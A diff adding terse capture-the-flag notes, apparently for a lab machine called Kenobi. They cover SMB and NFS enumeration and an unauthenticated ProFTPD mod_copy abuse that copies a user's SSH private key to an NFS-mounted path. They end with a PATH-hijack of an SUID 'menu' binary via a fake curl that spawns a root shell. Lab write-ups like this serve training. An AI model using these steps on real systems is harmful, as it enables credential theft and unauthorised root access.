@@ -1,0 +1,39 @@
+Enumerate samba shares using nmap script. (port 445, works over the internet.) [port 139 works for windows computers in same local network.]
+
+--script=smb-enum-shares.nse,smb-enum-users.nse
+
+use smbcient to inspect shares. 
+    smbclient //10.10.119.194/SHARE_NAME
+
+    Found log.txt.
+    Download the share recursively --> smbget -R smb://10.10.119.194/anonymous   
+    ProFTPD config found.
+
+We have nfs server at port 2049, but is through rpcbind at port 111.
+Use nmap scripts, " nfs-ls,nfs-statfs,nfs-showmount ". (on port 111).
+
+Connect to ftp. (Can also use "nc IP PORT" to connect)
+    a critical issue with proftpd installations that use the
+    mod_copy module's SITE CPFR/SITE CPTO commands; mod_copy allows these commands
+    to be used by *unauthenticated clients*:
+
+    Copy kenobi's private key to the /var mount that is accessible in the nfs server.
+
+        SITE CPFR /home/kenobi/.ssh/id_rsa
+        SITE CPTO /var/tmp/id_rsa_kenobi
+
+Mount the nfs var.
+
+SSH as kenobi:
+    Set chmod 600 on the key first.
+    ssh -i key
+
+Now privesc:
+    Find suid files.
+    Sus (different) file is /usr/bin/menu
+    Change the command the binary runs to /bin/sh to spawn a shell as root.
+    It uses "curl -I localhost" to find the status... Does not use the full /usr/bin/curl.... exploit this. [Found using "strings /usr/bin/menu"]
+
+        echo /bin/sh > curl
+        chmod 777 curl
+        export PATH=/home/kenobi:$PATH
